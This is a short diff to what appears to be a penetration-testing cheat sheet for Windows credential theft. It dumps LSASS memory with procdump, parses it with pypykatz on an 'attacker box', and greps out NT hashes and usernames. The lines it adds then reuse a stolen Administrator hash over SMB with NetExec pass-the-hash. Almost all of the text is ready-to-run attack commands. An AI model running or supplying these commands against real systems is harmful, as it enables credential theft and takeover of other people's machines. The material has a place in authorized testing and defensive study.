@@ -209,7 +209,11 @@ token::elevate
 # LSASS dump for offline parsing if binary blocked
 procdump64.exe -accepteula -ma lsass.exe lsass.dmp
 # then on attacker box:
-pypykatz lsa minidump lsass.dmp
+pypykatz lsa minidump lsass.dmp | tee lsass.out
+# then grep usernames
+grep NT lsass.out -B3 | grep -i username
+# Netexec pth
+nxc smb <IP> -u Administrator -H <hash>
 ```
 
 ---
